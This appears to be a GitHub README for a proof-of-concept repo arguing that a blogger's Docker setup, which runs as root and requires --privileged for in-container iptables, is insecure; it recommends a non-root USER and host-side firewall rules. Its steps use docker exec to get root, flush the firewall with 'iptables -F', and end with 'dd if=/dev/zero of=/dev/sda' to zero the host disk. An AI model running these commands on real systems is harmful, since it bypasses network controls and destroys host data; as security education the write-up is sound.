# How to hack your container

## Motivation

This repo is for PoC purpose. It demos my points that the blogger from [the blog here](https://dev.to/andre/docker-restricting-in--and-outbound-network-traffic-67p) is not securing his container at all. 

In his approach, he containerized a Node.js app. But he kept root permission in Dockerfile without switching to a unprivileged user. He also forced user to provide `--privileged` permission when lauching container so that he can manipulate iptables **inside** the container. He thought it was safe that he could switch user when launching his Node.js app.

It is wrong.

Obviously, he violated [the principles of least privilege in security](https://en.wikipedia.org/wiki/Principle_of_least_privilege). His misconfiguration in container opens up the door rather than secure the data.

My PoC steps below shows that anyone with docker group permission can bypass his firewall rule defined inside the container and also do some serious damage to the host machine `/dev`, i.e. no limit access hardware like hard disk.

There is a proper way to do this sort of things. For example, 

- Use `USER app` in his Dockerfile rather than switch user in `entrypoint.sh`.
- Modify firewall rule in the host rather than do that in the container. 

Our Internet is full of disinformation. Do **NOT** copy and paste anything blindly and think it is truth.

## Step 1 Create any long running container

You are unprivileged app user, right?

```
docker run --privileged --name "foobar" -it --rm rizhan/demo-misconfiguration-security-flaw  "/bin/sh"
$ whoami
app

```

## Step 2 Jail break

How about now?

- Remove your iptables

```
docker exec -it foobar /bin/sh


/ # whoami
root
/ # iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  192.168.0.0/24       anywhere            
DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             192.168.0.0/24      
DROP       all  --  anywhere             anywhere            
/ # iptables -F
/ # iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination      
```

- How about zero out your hard drive?

```
/ # ls /dev
autofs              hidraw3             network_latency     snd                 tty30               tty58               ttyS27              vcs5
bsg                 hidraw4             network_throughput  stderr              tty31               tty59               ttyS28              vcs6
btrfs-control       hidraw5             null                stdin               tty32               tty6                ttyS29              vcsa
bus                 hpet                nvram               stdout              tty33               tty60               ttyS3               vcsa1
console             hwrng               port                tpm0                tty34               tty61               ttyS30              vcsa2
core                i2c-0               ppp                 tty                 tty35               tty62               ttyS31              vcsa3
cpu                 i2c-1               ptmx                tty0                tty36               tty63               ttyS4               vcsa4
cpu_dma_latency     i2c-2               ptp0                tty1                tty37               tty7                ttyS5               vcsa5
cuse                i2c-3               pts                 tty10               tty38               tty8                ttyS6               vcsa6
dm-0                i2c-4               random              tty11               tty39               tty9                ttyS7               vcsu
dm-1                i2c-5               raw                 tty12               tty4                ttyS0               ttyS8               vcsu1
dm-10               i2c-6               rtc0                tty13               tty40               ttyS1               ttyS9               vcsu2
dm-2                i2c-7               sda                 tty14               tty41               ttyS10              udmabuf             vcsu3
dm-3                i2c-8               sda1                tty15               tty42               ttyS11              uhid                vcsu4
dm-4                input               sda2                tty16               tty43               ttyS12              uinput              vcsu5
dm-5                kmsg                sdb                 tty17               tty44               ttyS13              urandom             vcsu6
dm-6                kvm                 sdb1                tty18               tty45               ttyS14              usbmon0             vfio
dm-7                loop-control        sdc                 tty19               tty46               ttyS15              usbmon1             vga_arbiter
dm-8                loop0               sdc1                tty2                tty47               ttyS16              usbmon2             vhci
dm-9                lp0                 sdc2                tty20               tty48               ttyS17              usbmon3             vhost-net
dri                 lp1                 sdd                 tty21               tty49               ttyS18              usbmon4             vhost-vsock
drm_dp_aux0         lp2                 sdd1                tty22               tty5                ttyS19              vboxdrv             watchdog
drm_dp_aux1         lp3                 sdd2                tty23               tty50               ttyS2               vboxdrvu            watchdog0
fb0                 mapper              sg0                 tty24               tty51               ttyS20              vboxnetctl          watchdog1
fd                  mcelog              sg1                 tty25               tty52               ttyS21              vboxusb             zero
full                mei0                sg2                 tty26               tty53               ttyS22              vcs
fuse                mem                 sg3                 tty27               tty54               ttyS23              vcs1
hidraw0             memory_bandwidth    sg4                 tty28               tty55               ttyS24              vcs2
hidraw1             mqueue              shm                 tty29               tty56               ttyS25              vcs3
hidraw2             net                 snapshot            tty3                tty57               ttyS26              vcs4

/ # dd if=/dev/zero of=/dev/sda
```
